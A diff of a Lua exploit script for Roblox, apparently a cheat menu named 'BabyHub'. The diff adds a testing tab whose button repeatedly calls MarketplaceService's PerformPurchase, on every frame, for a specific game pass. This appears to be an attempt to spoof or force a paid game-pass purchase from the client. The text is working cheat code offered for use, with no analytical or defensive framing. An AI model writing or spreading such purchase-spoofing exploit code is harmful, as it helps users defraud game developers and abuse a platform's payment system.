@@ -21,6 +21,27 @@ local BuyMotelFundsTab = Window:MakeTab({
     PremiumOnly = false
 })
 
+local TestingTab = Window:MakeTab({
+      Name = "Testing Funtion",
+      Icon = "rbxassetid://4483345998",
+      PremiumOnly = false
+  })
+
+--BABYHUB TESTING
+
+TestingTab:AddButton({
+	Name = "Energy Game Pass",
+	Callback = function()
+            gamePassId = 52887752
+            market = game:GetService("MarketplaceService")
+            http = game:GetService("HttpService")
+            info = market:GetProductInfo(gamePassId, Enum.InfoType.GamePass)
+            game:GetService("RunService").Stepped:connect(function()
+            market:PerformPurchase(Enum.InfoType.Asset, info["ProductId"], info["PriceInRobux"], http:GenerateGUID(false))
+            end)
+      end
+})
+
 --BABYHUB FUCTIONS
 
 function instantInteract()
